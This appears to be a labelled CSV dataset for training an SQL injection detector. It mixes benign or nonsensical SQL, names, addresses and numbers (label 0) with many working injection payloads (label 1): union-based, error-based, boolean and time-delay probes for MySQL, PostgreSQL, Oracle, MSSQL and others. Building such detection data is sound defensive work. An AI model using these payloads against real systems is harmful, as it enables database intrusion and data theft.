Query,Label
"1""   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""bcxh"" like ""bcxh",1
8.51E+15,0
3.38196E+14,0
sevilla,0
"   SELECT within, badly+ ', ' + whistle+ ' ' + entire+ ', ' + plenty AS avoid  FROM does",0
SELECT * FROM particularly WHERE girl NOT LIKE 'letter%',0
select   (  case when   (  4568  =  4241  )   then 4568 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
21840329n,0
c/ cristobal quintero 86,0
"-5160'  )   union all select 8067,8067,8067,8067,8067,8067,8067--",1
7.38083E+15,0
"-9934""  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""xecb"" like ""xecb",1
SELECT * FROM OrdersWHERE OrderDate BETWEEN #07/01/1996# AND #07/31/1996#;,0
5h5c8,0
select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,1
bogs terradas,0
"  SELECT blueID AS ID, seven AS classroom FROM acres",0
"1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'txwf'  =  'txwf",1
SELECT measure ( s )  FROM yard UNION,0
9193,0
4.34481E+15,0
SELECT * FROM consider WHERE bone IN  ( SELECT walk FROM down ) ,0
SELECT were ( s ) FROM snake INNER JOIN,0
" SELECT column_name ( s )  FROM nice,nose",0
"-5911 union all select 2245,2245,2245,2245,2245,2245#",1
 or ''^',1
SELECT * FROM dog WHERE replied = 'golden' LIMIT 3,0
"  UPDATE bent SET compare =  'arrive', City =  'provide' WHERE chart =  spin",0
3.79218E+15,0
"  SELECT TIMESTAMP ( ""2017-07-23"",  ""13:10:11"" ) ;",0
"-2803""  )   union all select 5337,5337,5337,5337,5337,5337,5337#",1
SELECT * FROM fresh WHERE remove LIKE '%frame%',0
"iif  (  9229  =  4158,1,1/0  )  ",1
SELECT * FROM art WHERE physical = 'dropped' LIMIT 3,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'cxjp'  =  'cxjp",1
SELECT speed ( s )  FROM former LEFT JOIN,0
select sleep  (  5  )   and   (  'dcys' like 'dcys,1
select   (  case when   (  4636  =  1108  )   then 1 else 4636*  (  select 4636 from master..sysdatabases  )   end  )  --,1
"SELECT * FROM met WHERE entire BETWEEN ""tears"" AND    ""act""",0
4341,0
SELECT nearby ( s )  FROM thumb UNION,0
c0m51ar,0
"1""  )   as hhxx where 3372  =  3372 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"-2048   )    )    union all select 7054,7054,7054,7054,7054,7054,7054,7054,7054--",1
22587,0
indiestro,0
cea,0
retasac5n,0
SELECT storm ( s )  FROM might UNION ALL,0
"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  5130  =  5130",1
"1""  )   and make_set  (  4553  =  8132,8132  )   and   (  ""pfci"" like ""pfci",1
gribov-ridgeley@creacionwebs.lk,0
"   SELECT please,black,apart,leader,conversation     (  (  wonder JOIN beginning ON angle.zebra =  cattle.chicken )   INNER JOIN objectON Orders.office =  natural.haveID ) ",0
SELECT AVG ( molecular )  FROM week  SELECT SUM ( everywhere ) ,0
harvison,0
sorbello8@carrillo-de-albornoz.jobs,0
"1'   )    )    as kdwc where 5906  =  5906 union all select null,null,null,null,null,null,null,null,null--",1
95944263q,0
-7950'  )   or 9323  =  9323#,1
1' where 3701  =  3701 and 2006  =  2006,1
"calle santander, 0,",0
1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""vhey""  =  ""vhey",1
"   SELECT anybody, dish, forestFROM coal WHERE apartment  IS NOT NULL",0
"1  )   as bgvd where 1753  =  1753 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT knew FROM basket UNION ALL SELECT impossible FROM heading ORDER BY announced,0
"1'  )   as uytv where 7875  =  7875 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1""   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""hmun""  =  ""hmun",1
deltell riberas,0
aguinaga achutegui,0
1'  )   as fxid where 5926  =  5926,1
SELECT * FROM wore  WHERE beyond NOT LIKE '[beneath]%',0
cervera del ro alhama,0
"1'  )   as ssez where 5351  =  5351 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
garmasin,0
acedera,0
"1'||  (  select 'vqag' from dual where 8154  =  8154 union all select null,null,null,null,null,null,null,null,null,null--",1
1  )   as jqbp where 5407  =  5407 and 4595  =  4595#,1
SELECT TOP 50 PERCENT * FROM element,0
sitiwet-chagas@creacionesacampada.travel,0
SELECT AVG ( mental ) FROM thick,0
03291016s,0
"1,  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1
romeralo pers,0
-1219'  )   or 5592  =  4835,1
1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5fbcf5ac6f5bc' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
a24a70re8a,0
"1"" where 9760  =  9760 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1
"  SELECT whereID AS ID, which AS passage FROM bill",0
"1%'   )    )    union all select null,null,null,null,null,null,null,null,null--",1
mera alccer,0
-9975 where 9760  =  9760 order by 1--,1
1'||  (  select 'feki' where 4082  =  4082 and   (  3587  =  4207  )  *4207  )  ||',1
"1'+  (  select 'eoxk' where 6621  =  6621 union all select null,null#",1
kalila,0
"1'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   'wqme'  =  'wqme",1
SELECT loose FROM stretch UNION ALL SELECT buffalo FROM column ORDER BY leader,0
"1' and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"  SELECT Orders.futurerID, Employees.height, Employees.blow FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.tryID ORDER BY Orders.olderID",0
 UPDATE tune SET alphabet = 'fought'WHERE spent = 'seed',0
" SELECT * FROM farm ORDER BY spoken ASC, home DESC",0
"-1418""  )   where 7528  =  7528 order by 1#",1
"1'  )   where 8348  =  8348 and elt  (  4249  =  4249,7259  )  --",1
SELECT * FROM lower WHERE football  BETWEEN 10 AND 20,0
"-5218  )   union all select 9677,9677#",1
SELECT * FROM grain FETCH FIRST 3 ROWS ONLY,0
31271,0
5.26636E+15,0
"   SELECT Employees.continent, COUNT ( Orders.parentID )  AS settingFROM    ( OrdersINNER JOIN more ON Orders.shadeID  =  Employees.wheatID ) ",0
42855301e,0
"pasaje maria merida s/n, 4?h",0
"select count  (  *  )   from generate_series  (  1,5000000  )   and 'roca'  =  'roca",1
SELECT drive FROM wheel UNION SELECT slip FROM neck ORDER BY wave,0
FROM  ( SELECT DISTINCT wealth FROM planet ) ,0
"   SELECT potatoes, clearly, stillFROM yesterday WHERE bowl  IS NOT NULL",0
"1'||  (  select 'jonh' from dual where 2415  =  2415 union all select null,null,null,null,null,null,null,null,null--",1
76518142v,0
SELECT AVG ( involved ) FROM so SELECT SUM ( deer ) ,0
8.93945E+14,0
1'  )   order by 1--,1
holbrook,0
SELECT TOP 3 * FROM use,0
"-4033'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'ouup'  =  'ouup",1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_parent  =  27990 AND  ( wp_posts.post_mime_type LIKE 'image/%' )  AND wp_posts.post_type  =  'attachment' AND   (  (  wp_posts.post_status  =  'inherit'  )  )   ORDER BY wp_posts.menu_order ASC LIMIT 0, 1",0
"1' and elt  (  4249  =  4249,7259  )   and 'awjd'  =  'awjd",1
albertini_trauberg@theroxyblue.jo,0
SELECT * FROM merely,0
"1'  )   as jiic where 6158  =  6158 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
SELECT * FROM explain WHERE NOT this = 'blind'  AND NOT stranger = 'who',0
SELECT * FROM farm,0
"-9156'   )    )    union all select 9110,9110,9110,9110#",1
"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""hbfr"" like ""hbfr",1
-8069'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'qbvz'  =  'qbvz,1
agres,0
-2530%' order by 1#,1
SELECT DISTINCT mouth FROM cloud,0
" select * from users where id  =  1 +1<@ union select version  (    )  ,version  (    )   -- 1",1
SELECT * FROM tin FETCH FIRST 50 PERCENT ROWS ONLY,0
"   SELECT duck, nearby+ ', ' + quiet+ ' ' + wing+ ', ' + vessels AS engineer  FROM wherever",0
select   (  case when   (  5203  =  6330  )   then 5203 else 5203*  (  select 5203 from mysql.db  )   end  )  #,1
2.93801E+15,0
" SELECT * FROM Customers  WHERE Country NOT IN  ( 'Germany', 'France', 'UK' ) ;",0
SELECT * FROM honor 3,0
iza,0
"1%' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and '%'  =  '",1
"1""  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""azpb""  =  ""azpb",1
3690,0
1   )    )    as lkqx where 6468  =  6468 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
"   SELECT Employees.means, COUNT ( Orders.actuallyID )  AS hurryFROM    ( OrdersINNER JOIN effort ON Orders.appliedID  =  Employees.tankID ) ",0
1   )    )    as xbii where 2262  =  2262 or sleep  (  5  )  --,1
SELECT * FROM goes FETCH FIRST 3 ROWS ONLY,0
SELECT AVG ( fresh ) FROM child,0
"1%""   )    )    union all select null,null,null,null,null,null,null,null#",1
"1  )   as qjbd where 2808  =  2808   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1
canella,0
1'||  (  select 'goen' from dual where 8586  =  8586,1
SELECT * FROM graph WHERE tower = 'actual'  AND  ( gas = 'these' OR yard = 'eat' ) ,0
SELECT * FROM rice WHERE Price NOT BETWEEN 10 AND 20,0
"1'  )   where 2284  =  2284 and make_set  (  8403  =  8403,8899  )  --",1
-9893' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'pbop'  =  'pbop,1
boniquet jeria,0
"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   # fmxq",1
"   SELECT COUNT ( paid ) , cent FROM musical BY my",0
masters-mcnear@costablancarental.ax,0
pola,0
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_wp_wps_bg_non_library_sync_1_process_lock' LIMIT 1,0
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""vjlr"" like ""vjlr",1
SELECT * FROM independent WHERE below BETWEEN 'go' AND 'visitor',0
raimulfo,0
1' and   (  1088  =  7530  )  *7530 and 'xkfu'  =  'xkfu,1
 UPDATE settle SET feathers = 'motor'WHERE breathing = 'spent',0
SELECT COUNT ( sport ) FROM wore,0
tubal,0
-9690 union all select 7217#,1
"-6809""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""nfnf""  =  ""nfnf",1
"1   )    )     )   and elt  (  3132  =  1541,1541  )   and    (    (     (  4258  =  4258",1
SELECT dream ( s )  FROM folks SELECT fewer ( s ) ,0
"1""   )    )     )   union all select null#",1
vilanova de segri,0
"1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # hkrp",1
select case when 4656  =  3716 then 1 else null end--,1
3.18663E+15,0
SELECT * FROM earth  WHERE failed NOT LIKE '[pictured]%',0
vallclara,0
SELECT * FROM quite WHERE few = 'tobacco' LIMIT 3,0
-7293'   )    )     )   or 3038  =  3038,1
43736952z,0
5240,0
51518357j,0
diafragmar,0
SELECT * FROM Suppliers;,0
"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
villaseca de henares,0
"c/ corua, 25, 3h",0
scheppan-ishikawa@tuslimites.ly,0
11690,0
SELECT gasoline,0
SELECT * FROM vowel  WHERE layers NOT LIKE '[nearby]%',0
4562,0
" select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",1
6.16251E+15,0
"admin"" or 1  =  1--",1
arima@hormigon-impreso.nu,0
SELECT * FROM put  WHERE yet = exchange,0
"1,exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  1773  =  1773",1
0x77616974666F722064656C61792027303A303A313027 ...,1
" SELECT column_name ( s )  FROM together,summer",0
"SELECT DATE_ADD ( ""2017-06-15 09:34:21"", INTERVAL -3 HOUR ) ;",0
1'   )    )    as azsd where 3870  =  3870 waitfor delay '0:0:5'--,1
"1%'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  '%'  =  '",1
SELECT AVG ( war ) FROM layers SELECT SUM ( men ) ,0
hays_adiarte@lingotes.com.je,0
necforo,0
3.07443E+15,0
SELECT * FROM rhythm WHERE easily BETWEEN 'cent' AND 'bar',0
SELECT * FROM street ORDER BY suddenly,0
59072549q,0
"-4091   )    )    as lqqy where 3030  =  3030 union all select 3030,3030,3030#",1
" select * from users where id  =  '1' or \<   =  1 union select 1,@@VERSION -- 1'",1
"-9526 where 5734  =  5734 or elt  (  1032  =  1032,3623  )  --",1
ammiel,0
"1""   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  ""hxgu""  =  ""hxgu",1
SELECT AVG ( several ) FROM upward SELECT SUM ( identity ) ,0
virgen,0
SELECT * FROM ring WHERE bring = 'around' LIMIT 3,0
SELECT * FROM house WHERE bridge BETWEEN sat09/01/1996thread AND nation15/31/1996daily,0
19197,0
-2756' where 6156  =  6156 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
"1'||  (  select 'akye' where 9242  =  9242 union all select null,null,null,null,null,null#",1
SELECT AVG ( lower )  FROM lunch  SELECT SUM ( time ) ,0
SELECT ISNULL ( 350 ) ;,0
FROM  ( SELECT DISTINCT term FROM river ) ,0
"1'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'dhqz'  =  'dhqz",1
orejana,0
"INSERT INTO lake ( older, asleep, truth, voyage, stand, fireplace )  VALUES  ( 'motion', 'paragraph'. seeing', 'picture', 'rocky', 'running', 'engine' )  ",0
"1""  )   where 4172  =  4172 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1
michigan,0
"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm",1
llombai,0
zelda_hjelm5@silver-knights.it,0
1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
"  SELECT careful,tail,weight FROM wrote LEFT JOIN Orders ON eager.dogID =  past.fine ORDER BY recent.tea",0
"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'ichh' like 'ichh",1
"   SELECT troops,thousand,someone,energy,took     (  (  handle JOIN hello ON union.fish =  little.natural )   INNER JOIN keepON Orders.sides =  police.morningID ) ",0
SELECT wash ( s )  FROM aloud UNION ALL,0
87853992h,0
SELECT * FROM tone WHERE mathematics BETWEEN '1996-07-01' AND '1996-07-31',0
"  SELECT * FROM dawn WHERE men IN  ( 'determine', 'valuable', 'improve' )  ",0
"1%""   )    )    waitfor delay '0:0:5'--",1
aventada,0
" SELECT column_name ( s )  FROM hide,threw",0
SELECT DISTINCT effort FROM spell,0
SELECT build ( s )  FROM experiment UNION ALL,0
"c/ el columpio 13,",0
SELECT writer ( s )  FROM entire SELECT thirty ( s ) ,0
3xp2n18va,0
